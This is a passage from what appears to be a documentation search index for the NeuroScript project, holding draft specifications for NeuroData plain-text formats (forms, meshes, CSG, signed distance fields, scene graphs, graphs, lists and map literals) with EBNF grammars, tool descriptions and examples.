(<code>ReadFile</code>, <code>WriteFile</code>), no <code>ExecuteCommand</code>, no <code>CALL LLM</code>, etc.</p>"},{"location":"NeuroData/form/#5-ebnf-grammar-draft","title":"5. EBNF Grammar (Draft)","text":"<pre><code>form_file         ::= { metadata_line | comment_line | blank_line } { field_definition } ;\n\nmetadata_line     ::= optional_whitespace \"::\" whitespace key \":\" value newline ; (* As per references spec *)\n\nfield_definition  ::= optional_whitespace \"FIELD\" whitespace field_id newline { field_attribute_line } [ fenced_block ] ;\nfield_id          ::= identifier ;\n\nfield_attribute_line ::= indentation attribute_keyword whitespace attribute_value newline | multi_line_attribute ;\n\nattribute_keyword ::= \"LABEL\" | \"TYPE\" | \"VALUE\" | \"HELP\" | \"VALIDATION\" | \"DEFAULT\" | \"READONLY\" | \"VISIBLE\" | \"VALIDATE_NS\" | \"DEFAULT_NS\" | \"CALCULATE_NS\" | \"READONLY_NS\" | \"VISIBLE_NS\" ; (* NS ones are future *)\nattribute_value   ::= rest_of_line ; (* Specific parsing depends on keyword, includes literals, type specs, validation rules etc. *)\n\nmulti_line_attribute ::= indentation (\"VALUE\" | \"HELP\") whitespace \"```\" [ language_tag ] newline { text_line } optional_whitespace \"```\" newline ;\n\nfenced_block      ::= optional_whitespace \"```\" [ language_tag ] newline { text_line } optional_whitespace \"```\" newline ;\n\n(* Define: identifier, key, value, rest_of_line, type_spec, validation_rules, language_tag, text_line etc. *)\n</code></pre>"},{"location":"NeuroData/form/#6-tool-interaction","title":"6. Tool Interaction","text":"<p>Tools would interact with forms: * Rendering: A tool could take an <code>.ndform</code> definition and an optional <code>.ndobj</code> data instance to render an interactive form (e.g., in a terminal UI or web page). * Validation: <code>TOOL.ValidateFormData(form_ref, data_obj)</code> could validate the data in an <code>.ndobj</code> against the rules in its corresponding <code>.ndform</code>. * Extraction: <code>TOOL.ExtractFormData(form_ref)</code> could perhaps prompt a user to fill a form and return the resulting <code>.ndobj</code>. * Templating: <code>TOOL.RenderTemplate</code> could potentially use form data (<code>.ndobj</code>) as input.</p>"},{"location":"NeuroData/form/#7-example-ndform","title":"7. Example <code>.ndform</code>","text":"<pre><code>:: type: Form\n:: version: 0.1.0\n:: id: bug-report-form\n:: title: \"Bug Report\"\n\nFIELD report_id\n  LABEL \"Report ID\"\n  TYPE string\n  DEFAULT_NS \"CALL TOOL.GenerateUUID()\" # Future example\n  READONLY true\n  HELP \"Unique identifier for this report.\"\n\nFIELD summary\n  LABEL \"Summary\"\n  TYPE string\n  VALIDATION NOT NULL\n  HELP \"Provide a one-line summary of the issue.\"\n\nFIELD component\n  LABEL \"Component\"\n  TYPE enum(\"Core Interpreter\", \"Tooling\", \"Agent Mode\", \"NeuroData\", \"Other\")\n  DEFAULT \"Core Interpreter\"\n\nFIELD steps_to_reproduce\n  LABEL \"Steps to Reproduce\"\n  TYPE text\n  VALIDATION NOT NULL\n  HELP ```markdown\nPlease list the exact steps needed to trigger the bug.\n1. Step one...\n2. Step two...\n3. ...\n</code></pre> <p>FIELD logs # Example attaching a block for context/reference   LABEL \"Relevant Logs (Optional)\"   TYPE block_ref # Value would be a [ref:...] or empty   HELP \"Attach relevant log output below or reference a block ID.\" <pre><code>:: id: sample-log-format\nPaste logs here...\n</code></pre></p> <p>FIELD severity   LABEL \"Severity (1-5)\"   TYPE int   DEFAULT 3   VALIDATION NOT NULL VALIDATE_NS(\"{{value}} &gt;= 1 AND {{value}} &lt;= 5\") # Future Example</p>"},{"location":"NeuroData/geometry/","title":"NeuroData Geometry &amp; Scene Formats Specification","text":"<p>:: type: Specification :: version: 0.1.0 :: status: draft :: dependsOn: docs/metadata.md, docs/references.md, docs/neurodata/symbolic_math.md, docs/neurodata/tree.md, docs/neurodata_and_composite_file_spec.md :: howToUpdate: Refine attributes and syntax for each format, specify coordinate systems/units conventions, detail tool requirements.</p>"},{"location":"NeuroData/geometry/#1-purpose","title":"1. Purpose","text":"<p>This document defines a set of NeuroData formats for representing 3D geometry and scene structures: * Polygon Meshes (<code>.ndmesh</code>): Explicit representation using vertices and faces. * Constructive Solid Geometry (<code>.ndcsg</code>): Implicit representation using boolean operations on primitive shapes. * Signed Distance Fields (<code>.ndsdf</code>): Implicit representation using a distance function. * Scene Graphs (<code>.ndscenegraph</code>): Hierarchical structure for organizing transformations, geometry, lights, and cameras.</p> <p>These formats aim to provide structured, human-readable (where practical) representations suitable for use within the NeuroScript ecosystem, primarily intended for manipulation and rendering by dedicated tools.</p>"},{"location":"NeuroData/geometry/#2-common-elements","title":"2. Common Elements","text":"<ul> <li>Metadata: Each format uses standard <code>:: key: value</code> metadata [cite: uploaded:neuroscript/docs/metadata.md], including <code>:: type: &lt;TypeName&gt;</code>, <code>:: version:</code>, and potentially <code>:: id:</code>, <code>:: description:</code>.</li> <li>Units &amp; Coordinate System: A convention should be established (e.g., default to millimeters, right-handed Y-up coordinate system) or specified via metadata (e.g., <code>:: units: mm</code>, <code>:: coords: RHS_Y_UP</code>). This is crucial for interoperability.</li> <li>References: Standard NeuroScript references (<code>[ref:&lt;location&gt;[#&lt;block_id&gt;]]</code> [cite: generated previously in <code>docs/references.md</code>]) are used extensively, especially in Scene Graphs, to link nodes to geometry, materials, lights, cameras, etc.</li> <li>Data Representation: Large datasets (like mesh vertices) might be stored line-by-line or within fenced blocks. Functional representations (<code>.ndcsg</code>, <code>.ndsdf</code>) use fenced blocks. Scene graphs use indentation and tagged attribute lines.</li> </ul>"},{"location":"NeuroData/geometry/#3-format-specifications","title":"3. Format Specifications","text":""},{"location":"NeuroData/geometry/#31-polygon-mesh-ndmesh","title":"3.1 Polygon Mesh (<code>.ndmesh</code>)","text":"<ul> <li>Purpose: Represents geometry as a collection of vertices and polygons (faces).</li> <li><code>:: type: Mesh</code></li> <li>Structure: Typically uses tagged lines or sections for vertices and faces.</li> <li>Attributes/Sections:<ul> <li><code>VERTEX &lt;x&gt; &lt;y&gt; &lt;z&gt;</code>: Defines a vertex. Coordinates are floats.</li> <li><code>FACE &lt;idx1&gt; &lt;idx2&gt; &lt;idx3&gt; [&lt;idx4&gt;...]</code>: Defines a polygon face using 1-based indices into the vertex list. Supports triangles, quads, or n-gons (tool support may vary).</li> <li><code>NORMAL &lt;nx&gt; &lt;ny&gt; &lt;nz&gt;</code>: (Optional) Defines a vertex normal. Usually listed in the same order as vertices.</li> <li><code>UV &lt;u v&gt;</code>: (Optional) Defines a texture coordinate. Usually listed in the same order as vertices.</li> <li>(Alternative: Vertex, Face, Normal, UV data could be placed within fenced blocks, e.g., <code>csv ...</code> or <code>json ...</code>, for large meshes).</li> </ul> </li> <li>Example: <pre><code>:: type: Mesh\n:: version: 0.1.0\n:: id: simple-cube-mesh\n\nVERTEX 0 0 0; VERTEX 1 0 0; VERTEX 1 1 0; VERTEX 0 1 0\nVERTEX 0 0 1; VERTEX 1 0 1; VERTEX 1 1 1; VERTEX 0 1 1\n\nFACE 1 2 3 4; FACE 5 6 7 8; FACE 1 2 6 5\nFACE 2 3 7 6; FACE 3 4 8 7; FACE 4 1 5 8\n</code></pre></li> </ul>"},{"location":"NeuroData/geometry/#32-constructive-solid-geometry-ndcsg","title":"3.2 Constructive Solid Geometry (<code>.ndcsg</code>)","text":"<ul> <li>Purpose: Represents shapes by combining primitive solids using boolean operations.</li> <li><code>:: type: CSG</code></li> <li>Structure: A tree of operations and primitives, represented using Functional Notation (similar to <code>.ndmath</code>) within a fenced block.</li> <li>Syntax: Defines functions for primitives, operations, and transformations.<ul> <li>Primitives: <code>Sphere(radius)</code>, <code>Cube(size | Vector(sx, sy, sz))</code>, <code>Cylinder(radius, height)</code>...</li> <li>Operations: <code>Union(obj1, obj2, ...)</code>, <code>Difference(obj1, obj2, ...)</code>, <code>Intersection(obj1, obj2, ...)</code></li> <li>Transformations: <code>Translate(Vector(tx, ty, tz), obj)</code>, <code>Rotate(Vector(ax, ay, az), angle_degrees, obj)</code>, <code>Scale(Vector(sx, sy, sz), obj)</code></li> <li>Helper: <code>Vector(x, y, z)</code></li> </ul> </li> <li>Example: <pre><code>:: type: CSG\n:: version: 0.1.0\n:: id: csg-example\n\n```funcgeom\nDifference(\n  Cube(size=20), # Assuming centered cube if Vector not used\n  Sphere(radius=13)\n)\n</code></pre>     ```</li> </ul>"},{"location":"NeuroData/geometry/#33-signed-distance-field-ndsdf","title":"3.3 Signed Distance Field (<code>.ndsdf</code>)","text":"<ul> <li>Purpose: Represents shapes implicitly via a function <code>f(x, y, z)</code> yielding the shortest signed distance to the surface.</li> <li><code>:: type: SDF</code></li> <li>Structure: The core is a mathematical expression defining the distance function. Uses the <code>.ndmath</code> Functional Notation.</li> <li>Syntax: Contains a fenced block storing the <code>.ndmath</code> expression.</li> <li>Example: <pre><code>:: type: SDF\n:: version: 0.1.0\n:: id: sphere-sdf-example\n\n```funcmath\n# Defines f(x, y, z) = length(Vector(x,y,z)) - radius\nSubtract( Length(Vector(x, y, z)), 5.0 )\n</code></pre>     ```</li> </ul>"},{"location":"NeuroData/geometry/#34-scene-graph-ndscenegraph","title":"3.4 Scene Graph (<code>.ndscenegraph</code>)","text":"<ul> <li>Purpose: Represents a hierarchical structure of nodes containing transformations, references to content (geometry, lights, cameras), materials, and potentially grouping other nodes.</li> <li><code>:: type: SceneGraph</code></li> <li>Structure: Uses an indentation-based tree structure (like <code>.ndtree</code>). Each node is defined by <code>NODE &lt;node_id&gt;</code> followed by indented tagged attribute lines (like <code>.ndform</code>).</li> <li>Node Attributes:<ul> <li><code>LABEL \"&lt;friendly_name&gt;\"</code>: (Optional) Human-readable name.</li> <li><code>TRANSFORM &lt;transform_definition&gt;</code>: Node's transformation relative to parent. Uses Functional Notation (e.g., <code>Translate(...) Rotate(...) Scale(...)</code>).</li> <li><code>CONTENT_REF \"[ref:&lt;location&gt;#&lt;content_id&gt;]\"</code>: Reference to <code>.ndmesh</code>, <code>.ndcsg</code>, <code>.ndsdf</code>, <code>.ndlight</code>, <code>.ndcamera</code>, etc.</li> <li><code>MATERIAL_REF \"[ref:&lt;material_id&gt;]\"</code>: (Optional) Reference to a material definition (presumed <code>.ndmat</code> format).</li> <li><code>PROPERTY &lt;key&gt; &lt;value&gt;</code>: (Optional) Custom user data.</li> </ul> </li> <li>Example: <pre><code>:: type: SceneGraph\n:: version: 0.1.0\n:: id: simple-scene\n\nNODE root\n  NODE object1\n    LABEL \"Translated Cube\"\n    TRANSFORM Translate(5, 0, 0)\n    CONTENT_REF \"[ref:this#simple-cube-mesh]\" # Refers to mesh defined elsewhere in same composite doc\n  NODE object2\n    LABEL \"Rotated Sphere Group\"\n    TRANSFORM Rotate(0, 1, 0, 45)\n    NODE sphere_visual # Child node\n      LABEL \"Actual Sphere\"\n      CONTENT_REF \"[ref:geometry/primitives.ndsdf#unit-sphere]\" # Refers to SDF in another file\n      MATERIAL_REF \"[ref:materials.ndmat#blue_plastic]\"\n  NODE main_camera\n    TRANSFORM Translate(0, 10, 20) LookAt(0, 0, 0)\n    CONTENT_REF \"[ref:cameras.ndcamera#default]\"\n</code></pre></li> </ul>"},{"location":"NeuroData/geometry/#5-tooling-requirements","title":"5. Tooling Requirements","text":"<p>Using these geometry and scene formats requires a significant suite of new NeuroScript tools, likely wrapping external geometry processing, CAS, and/or rendering libraries: * Parsing Tools: <code>TOOL.ParseMesh</code>, <code>TOOL.ParseCSG</code>, <code>TOOL.ParseSDF</code> (using <code>TOOL.MathFromFunctional</code>), <code>TOOL.ParseSceneGraph</code>. * Evaluation/Processing Tools:     * <code>TOOL.EvaluateCSG</code> -&gt; <code>.ndmesh</code> (Convert CSG to mesh).     * <code>TOOL.MeshFromSDF</code> -&gt; <code>.ndmesh</code> (e.g., Marching Cubes).     * <code>TOOL.EvaluateSDF(sdf_ref, x, y, z)</code> -&gt; <code>distance</code>.     * <code>TOOL.ProcessSceneGraph</code> (e.g., flatten transforms, collect renderable objects).     * <code>TOOL.MeshBoolean(mesh_a, mesh_b, operation)</code>     * <code>TOOL.SimplifyMesh</code>, <code>TOOL.ValidateMesh</code>, <code>TOOL.CalculateMeshVolume</code>, etc. * Rendering Tools: <code>TOOL.RenderSceneGraph(scene_ref, camera_ref)</code> -&gt; <code>image_data</code> (Could be complex, potentially invoking external renderers). * Conversion Tools: <code>TOOL.ExportMesh(mesh_ref, format)</code> (e.g., format=\"stl\", \"obj\").</p>"},{"location":"NeuroData/graph/","title":"NeuroData Graph Format (.ndgraph) Specification","text":"<p>:: type: GraphFormatSpec :: version: 0.1.1 :: status: draft :: dependsOn: docs/metadata.md, docs/neurodata_and_composite_file_spec.md :: howToUpdate: Review decisions, update EBNF, ensure examples match spec.</p>"},{"location":"NeuroData/graph/#1-purpose","title":"1. Purpose","text":"<p>NeuroData Graphs (<code>.ndgraph</code>) provide a simple, human-readable plain-text format for representing node-edge graph structures. The format prioritizes human readability while being machine-parseable. It is designed primarily to be read by humans and updated by tools or AI, supporting explicit bidirectional link representation for clarity.</p>"},{"location":"NeuroData/graph/#2-syntax","title":"2. Syntax","text":"<p>A <code>.ndgraph</code> file consists of: 1.  Optional file-level metadata lines (using <code>:: key: value</code> syntax [cite: uploaded:neuroscript/docs/metadata.md]). 2.  Optional comments (<code>#</code> or <code>--</code>) and blank lines. 3.  A series of <code>NODE</code> definitions. 4.  Each <code>NODE</code> definition can be followed by:     a. An optional attached fenced data block (for complex properties).     b. Indented <code>EDGE</code> definitions representing connections (outgoing, incoming, or undirected) associated with that node.</p>"},{"location":"NeuroData/graph/#21-file-level-metadata","title":"2.1 File-Level Metadata","text":"<p>Standard <code>:: key: value</code> lines at the very beginning of the file. Recommended metadata includes: * <code>:: type: Graph</code> (Required) * <code>:: version: &lt;semver&gt;</code> (Required) * <code>:: id: &lt;unique_graph_id&gt;</code> (Optional but recommended) * <code>:: directed: &lt;true|false&gt;</code> (Optional, defaults to true. Affects edge interpretation.) * <code>:: description: &lt;text&gt;</code> (Optional)</p>"},{"location":"NeuroData/graph/#22-node-definition-line","title":"2.2 Node Definition Line","text":"<ul> <li>Format: <code>NODE NodeID [Optional Simple Properties]</code></li> <li><code>NODE</code>: Keyword indicating a node definition.</li> <li><code>NodeID</code>: A unique identifier for the node within the graph. Must start with a letter or underscore, followed by letters, numbers, or underscores (<code>[a-zA-Z_][a-zA-Z0-9_]*</code>). IDs are case-sensitive.</li> <li><code>[Optional Simple Properties]</code>: An optional block enclosed in square brackets <code>[]</code> containing simple key-value properties for the node (see Section 2.4). Complex properties should use an Attached Data Block (see Section 2.5).</li> </ul>"},{"location":"NeuroData/graph/#23-edge-definition-lines","title":"2.3 Edge Definition Lines","text":"<ul> <li>Format: <code>Indentation EdgeMarker TargetNodeID [Optional Simple Properties]</code></li> <li>Indentation: One or more spaces or tabs MUST precede the edge marker. This indicates the edge belongs to the preceding <code>NODE</code> definition.</li> <li>EdgeMarker:<ul> <li><code>-&gt;</code>: Indicates an outgoing directed edge from the parent <code>NODE</code> to the <code>TargetNodeID</code>.</li> <li><code>&lt;-</code>: Indicates an incoming directed edge from the <code>TargetNodeID</code> to the parent <code>NODE</code>.</li> <li><code>--</code>: Indicates an undirected edge between the parent <code>NODE</code> and the <code>TargetNodeID</code>.</li> </ul> </li> <li><code>TargetNodeID</code>: The ID of the node the edge connects to (or originates from, for <code>&lt;-</code>). Must be a valid <code>NodeID</code>.</li> <li><code>[Optional Simple Properties]</code>: An optional block enclosed in square brackets <code>[]</code> containing simple key-value properties for the edge (see Section 2.4). Complex edge properties are discouraged; consider representing complex edge data as a separate node if necessary.</li> </ul> <p>Consistency Requirement: For every explicitly listed directed edge (e.g., <code>A -&gt; B [prop]</code>), the corresponding reverse edge (<code>B &lt;- A [prop]</code>) SHOULD also be listed under the target node's definition. For every undirected edge (<code>A -- B [prop]</code>), the corresponding edge (<code>B -- A [prop]</code>) SHOULD also be listed. A formatting tool (<code>ndgraphfmt</code>) should be used to enforce this consistency.</p>"},{"location":"NeuroData/graph/#24-simple-property-definitions-inline","title":"2.4 Simple Property Definitions (Inline)","text":"<p>Simple properties can be included directly within square brackets <code>[]</code> on the <code>NODE</code> or <code>EDGE</code> line. This is suitable for labels, weights, statuses, etc. * Format: <code>[key1: value1, key2: value2, ...]</code> * Enclosed in square brackets <code>[]</code>. * Consists of one or more comma-separated <code>key: value</code> pairs. * <code>key</code>: A simple identifier (letters, numbers, underscore, hyphen). * <code>value</code>: Can be:     * A number (<code>123</code>, <code>4.5</code>, <code>-10</code>).     * A boolean (<code>true</code>, <code>false</code>).     * A quoted string (<code>\"like this\"</code>, <code>'or this'</code>). Allows standard escapes.     * An unquoted simple string (no spaces or special characters like <code>[]:,\"</code>).</p>"},{"location":"NeuroData/graph/#25-complex-properties-attached-data-block","title":"2.5 Complex Properties (Attached Data Block)","text":"<p>For nodes requiring complex or extensive properties (e.g., nested data, lists, multi-line text), a standard fenced data block (like JSON or YAML) can be placed immediately following the <code>NODE</code> definition line it applies to. * The block should use standard <code>syntax, optionally specifying the data format (e.g.,</code>json). * Tools parsing the <code>.ndgraph</code> file should associate the content of this block with the immediately preceding <code>NODE</code>. * This leverages existing block extraction mechanisms [cite: uploaded:neuroscript/pkg/neurodata/blocks/blocks_extractor.go].</p> <p>Example: <pre><code>NODE N3 [label: \"Node with Data Block\"]\n```json\n{\n  \"description\": \"Uses JSON.\",\n  \"config\": {\"attempts\": 3}\n}\n</code></pre>   # Edges for N3 would follow here   -&gt; N4 NODE N4 ... <pre><code>### 2.6 Comments and Blank Lines\n\nLines starting with `#` or `--` (after optional whitespace) are comments and are ignored. Blank lines are also ignored.\n\n## 3. EBNF Grammar (Draft)\n\n(* EBNF reflecting attached data block *)\n```ebnf\ngraph_file        ::= { metadata_line | comment_line | blank_line } { node_definition_block } ;\n\nmetadata_line     ::= optional_whitespace \"::\" whitespace key \":\" value newline ;\nkey               ::= identifier ;\nvalue             ::= rest_of_line ;\n\nnode_definition_block ::= node_definition_line [ fenced_data_block ] { edge_definition } ;\n\nnode_definition_line  ::= optional_whitespace \"NODE\" whitespace node_id [ whitespace simple_property_block ] newline ;\nnode_id           ::= identifier ;\n\nedge_definition   ::= indentation edge_marker whitespace node_id [ whitespace simple_property_block ] newline ;\nindentation       ::= whitespace+ ;\nedge_marker       ::= \"-&gt;\" | \"&lt;-\" | \"--\" ;\n\nsimple_property_block ::= \"[\" property_list \"]\" ;\nproperty_list     ::= property_entry { \",\" property_entry } ;\nproperty_entry    ::= optional_whitespace key optional_whitespace \":\" optional_whitespace property_value optional_whitespace ;\nproperty_value    ::= number_literal | boolean_literal | string_literal | simple_string ;\n\nfenced_data_block ::= optional_whitespace \"```\" [ language_tag ] newline { text_line } optional_whitespace \"```\" newline ;\nlanguage_tag      ::= identifier ;\ntext_line         ::= any_character_except_backticks newline ;\n\nidentifier        ::= letter { letter | digit | \"_\" } ;\nletter            ::= \"a..z\" | \"A..Z\" | \"_\" ;\ndigit             ::= \"0..9\" ;\nsimple_string     ::= (letter | digit | \"_\" | \"-\")+ ;\n\n(* Standard definitions needed: number_literal, boolean_literal, string_literal, whitespace, newline, comment_line, blank_line *)\n</code></pre> (Note: This EBNF is a draft.)</p>"},{"location":"NeuroData/graph/#4-rendering","title":"4. Rendering","text":"<p>Tools can parse this format and render it into other graphical representations like DOT (Graphviz), JSON Graph Format, GML, etc. The rendering mechanism is separate from this specification.</p>"},{"location":"NeuroData/graph/#5-example","title":"5. Example","text":"<pre><code>:: type: Graph\n:: version: 0.1.1\n:: id: example-graph-props\n:: directed: true\n:: description: Example with simple and complex properties.\n\nNODE StartNode [label: \"Start\", shape: \"circle\", initial_value: 0]\n  # Edges for StartNode\n  -&gt; MidNode [weight: 2.1]\n  -- AltNode # Undirected\n\nNODE MidNode [label: \"Processing\"]\n  # Complex properties via attached JSON block\n  ```json\n  {\n    \"retries\": 3,\n    \"timeout_ms\": 5000,\n    \"parameters\": {\"alpha\": 0.5, \"beta\": 0.1}\n  }\n  ```\n  # Edges for MidNode\n  &lt;- StartNode [weight: 2.1]\n  -&gt; EndNode [label: \"Success\"]\n\nNODE EndNode [label: \"End\", shape: \"doublecircle\"]\n  &lt;- MidNode [label: \"Success\"]\n\nNODE AltNode [status: \"alternative\"]\n  -- StartNode # Undirected\n</code></pre>"},{"location":"NeuroData/list/","title":"NeuroData Simple List Format (.ndlist) Specification","text":"<p>:: type: ListFormatSpec :: version: 0.1.0 :: status: draft :: dependsOn: docs/metadata.md, docs/references.md, docs/NeuroData/checklist.md, docs/neurodata_and_composite_file_spec.md :: howToUpdate: Refine syntax, parsing options, tooling descriptions, EBNF, examples.</p>"},{"location":"NeuroData/list/#1-purpose","title":"1. Purpose","text":"<p>NeuroData Simple Lists (<code>.ndlist</code>) provide a minimal, human-readable plain-text format for representing ordered or hierarchical lists of items, primarily intended for simple text entries or references. It serves as a simpler alternative to the NeuroData Checklist format [cite: uploaded:neuroscript/docs/NeuroData/checklist.md] when status tracking (<code>[ ]</code>, <code>[x]</code>) is not required.</p>"},{"location":"NeuroData/list/#2-relation-to-checklist-format-ndcl","title":"2. Relation to Checklist Format (<code>.ndcl</code>)","text":"<p>The <code>.ndlist</code> format uses a syntax visually similar to <code>.ndcl</code> but removes the status marker (<code>[...]</code> or <code>|...|</code>). It focuses purely on the list items and their hierarchical structure (if any), indicated by indentation.</p>"},{"location":"NeuroData/list/#3-syntax","title":"3. Syntax","text":"<p>An <code>.ndlist</code> file or block consists of: 1.  Optional file-level metadata lines (using <code>:: key: value</code> syntax [cite: uploaded:neuroscript/docs/metadata.md]). 2.  Optional comments (<code>#</code> or <code>--</code>) and blank lines. 3.  A series of list item lines.</p>"},{"location":"NeuroData/list/#31-fileblock-level-metadata","title":"3.1 File/Block-Level Metadata","text":"<p>Standard <code>:: key: value</code> lines [cite: uploaded:neuroscript/docs/metadata.md]. Recommended metadata includes: * <code>:: type: SimpleList</code> (or <code>ItemList</code>) (Required) * <code>:: version: &lt;semver&gt;</code> (Required) * <code>:: id: &lt;unique_list_id&gt;</code> (Optional if referenced) * <code>:: description: &lt;text&gt;</code> (Optional)</p>"},{"location":"NeuroData/list/#32-list-item-line","title":"3.2 List Item Line","text":"<ul> <li>Format: <code>Indentation - Item Text</code></li> <li><code>Indentation</code>: Zero or more spaces or tabs. The level of indentation defines the item's parent in the hierarchy (the nearest preceding item line with less indentation). Consistent indentation is recommended.</li> <li><code>-</code>: A literal hyphen followed by a single space MUST precede the item text.</li> <li><code>Item Text</code>: The content of the list item. This is treated as a raw string and can include any characters, including NeuroScript References (<code>[ref:...]</code> [cite: generated previously in <code>docs/references.md</code>]). Leading/trailing whitespace after the required space is part of the item text.</li> </ul>"},{"location":"NeuroData/list/#33-comments-and-blank-lines","title":"3.3 Comments and Blank Lines","text":"<p>Lines starting with <code>#</code> or <code>--</code> (after optional whitespace) are comments and are ignored by the parser. Blank lines are also ignored and do not typically contribute to the structure, although tools could optionally preserve them if needed for specific rendering.</p>"},{"location":"NeuroData/list/#4-ebnf-grammar-draft","title":"4. EBNF Grammar (Draft)","text":"<pre><code>list_file         ::= { metadata_line | comment_line | blank_line } { list_item_line } ;\n\nmetadata_line     ::= optional_whitespace \"::\" whitespace key \":\" value newline ; (* As per references spec *)\n\nlist_item_line    ::= indentation \"-\" whitespace item_text newline ;\nindentation       ::= { \" \" | \"\\t\" } ; (* Parsed to determine level *)\nitem_text         ::= rest_of_line ; (* Raw text content *)\n\n(* Define: key, value, rest_of_line, whitespace, newline, comment_line, blank_line *)\n</code></pre>"},{"location":"NeuroData/list/#5-tool-interaction","title":"5. Tool Interaction","text":"<p>Interaction with <code>.ndlist</code> data primarily involves parsing the content into a usable structure.</p> <ul> <li>Parsing (<code>TOOL.ParseList</code> - hypothetical): A dedicated tool would parse the <code>.ndlist</code> content (provided as a string or via a <code>[ref:...]</code>).<ul> <li>Input: <code>list_content_or_ref</code> (String or Reference)</li> <li>Options (Optional):<ul> <li><code>output_format</code> (String): <code>\"hierarchy\"</code> (default), <code>\"flat_text\"</code>, <code>\"flat_indent\"</code>.</li> </ul> </li> <li>Output:<ul> <li>Default (<code>\"hierarchy\"</code>): Returns a nested structure representing the tree inferred from indentation (e.g., a list of maps, where each map has <code>\"text\"</code> and <code>\"children\"</code> keys).</li> <li><code>\"flat_text\"</code>: Returns a simple flat list of strings, containing the text of each item in document order.</li> <li><code>\"flat_indent\"</code>: Returns a flat list of maps, where each map contains <code>{\"text\": string, \"indent\": int}</code>.</li> </ul> </li> <li>Reference Handling: The parser reads <code>Item Text</code> literally. It does not automatically resolve <code>[ref:...]</code> strings found within item text. Resolution must be handled by subsequent steps in the calling NeuroScript procedure if needed.</li> </ul> </li> <li>Hierarchy Check (<code>TOOL.IsListHierarchical</code> - hypothetical): A potential helper tool, as you suggested (perhaps named like this), could take the parsed data (e.g., the output from <code>TOOL.ParseList</code> in <code>\"flat_indent\"</code> format) and return <code>true</code> if items have varying indentation levels, <code>false</code> otherwise. This confirms if a list uses nesting.</li> </ul>"},{"location":"NeuroData/list/#6-example","title":"6. Example","text":"<pre><code>:: type: SimpleList\n:: version: 0.1.0\n:: description: List of relevant specification documents.\n\n- Core Language\n  - [ref:docs/script spec.md]\n  - [ref:docs/formal script spec.md]\n- NeuroData Formats\n  - [ref:docs/NeuroData/checklist.md]\n  - [ref:docs/neurodata/table.md]\n  - [ref:docs/neurodata/graph.md]\n  - [ref:docs/neurodata/tree.md]\n  - [ref:docs/neurodata/form.md]\n  - [ref:this] # Reference to this list spec itself\n- Supporting Concepts\n  - [ref:docs/metadata.md]\n  - [ref:docs/references.md]\n- Tooling\n  - [ref:pkg/core/interpreter.go]\n  - [ref:pkg/neurogo/app.go]\n</code></pre>"},{"location":"NeuroData/map_literal/","title":"Map Literal","text":"<p>:: version: 0.1.0 :: type: NSproject :: subtype: spec :: dependsOn: docs/metadata.md, docs/script spec.md, docs/neurodata_and_composite_file_spec.md :: howToUpdate: Review dependency specs (NS map literals) and update syntax/examples if they change.</p>"},{"location":"NeuroData/map_literal/#neuroscript-map-literal-data-format-ns-map-literal-specification","title":"NeuroScript Map Literal Data Format (<code>ns-map-literal</code>) Specification","text":""},{"location":"NeuroData/map_literal/#1-purpose","title":"1. Purpose","text":"<p>This specification defines how to represent structured key-value data using the native NeuroScript map literal syntax, typically embedded within a fenced code block in a composite document (like Markdown). This format is intended for scenarios where structured data (like configuration, definitions, or simple object representations) needs to be associated with other content, leveraging the existing NeuroScript parser rather than introducing external formats like YAML or JSON.</p>"},{"location":"NeuroData/map_literal/#2-relation-to-neuroscript","title":"2. Relation to NeuroScript","text":"<p>The content of an <code>ns-map-literal</code> block is a single, valid NeuroScript map literal expression. Its syntax and semantics are directly governed by the NeuroScript Language Specification's definition of map literals [script spec.md].</p>"},{"location":"NeuroData/map_literal/#3-syntax","title":"3. Syntax","text":"<p>An <code>ns-map-literal</code> data block consists of: 1.  An opening fence: <code>```ns-map-literal</code> or <code>```neuroscript-map</code> (using <code>ns-map-literal</code> is recommended for clarity). 2.  Optional block-level metadata lines (using <code>:: key: value</code> syntax [metadata.md]). Recommended metadata includes <code>:: type: MapLiteralData</code> and <code>:: version: &lt;semver&gt;</code>. 3.  Optional comments (<code>#</code> or <code>--</code>) and blank lines. 4.  A single NeuroScript map literal expression: <code>{ \"key1\": &lt;value_expr1&gt;, \"key2\": &lt;value_expr2&gt;, ... }</code>.     * Keys must be string literals (<code>\"...\"</code> or <code>'...'</code>).     * Values can be any valid NeuroScript expression (literals: string, number, boolean; nested lists <code>[...]</code>; nested maps <code>{...}</code>). Note that variables or function calls within these value expressions are typically not evaluated when simply parsing the data structure; evaluation context depends on the tool consuming the map literal. 5.  A closing fence: <code>```</code>.</p>"},{"location":"NeuroData/map_literal/#4-parsing-and-tooling","title":"4. Parsing and Tooling","text":"<p>Tools encountering a block tagged <code>ns-map-literal</code> should: 1.  Extract the content within the fences. 2.  Parse the content using the NeuroScript expression parser, specifically targeting the <code>map_literal</code> rule [formal script spec.md]. 3.  The result of the parse should be an Abstract Syntax Tree (AST) representation of the map literal, or an equivalent data structure (like Go's <code>map[string]interface{}</code>) representing the nested key-value pairs and literals found within. 4.  Further interpretation or evaluation of expressions within the map's values depends on the consuming tool's specific requirements.</p>"},{"location":"NeuroData/map_literal/#5-example","title":"5. Example","text":"<pre><code>Some context...\n\n```ns-map-literal\n:: type: MapLiteralData\n:: version: 1.0.0\n:: id: term-definitions-example\n\n# Example map literal holding term definitions\n{\n  \"TermA\": {\n    \"description\": \"The first term.\",\n    \"reference\": \"[ref:./glossary.md#term-a]\",\n    \"value_type\": \"string\"\n  },\n  \"TermB\": {\n    \"description\": \"The second term, with a list.\",\n    \"aliases\": [\"AliasB1\", \"AliasB2\"],\n    \"value_type\": \"integer\"\n  },\n  \"TermC\": {\n    \"description\": \"A boolean flag.\" , # Example comment within map\n    \"value_type\": \"boolean\",\n    \"default\": true\n  }\n}\n</code></pre> <p>More context... ```</p>"},{"location":"NeuroData/map_schema/","title":"Map Schema","text":"<p>:: type: NSproject :: subtype: spec :: version: 0.1.0 :: id: ndmap-schema-spec :: status: draft :: dependsOn: docs/metadata.md, docs/script spec.md, docs/NeuroData/map_literal.md, docs/NeuroData/references.md :: howToUpdate: Review syntax, especially enum definitions and TYPE references, for clarity and consistency with other specs.</p>"},{"location":"NeuroData/map_schema/#neurodata-map-schema-format-ndmap_schema-specification","title":"NeuroData Map Schema Format (.ndmap_schema) Specification","text":""},{"location":"NeuroData/map_schema/#1-purpose","title":"1. Purpose","text":"<p>NeuroData Map Schema (<code>.ndmap_schema</code>) defines the expected structure, constraints, and documentation for key-value data represented using the NeuroScript Map Literal Data Format [map_literal.md]. It acts as a schema, allowing tools to validate map literal instances, understand the purpose of different keys, enforce required fields, and manage named, reusable enumerated value lists with descriptions. 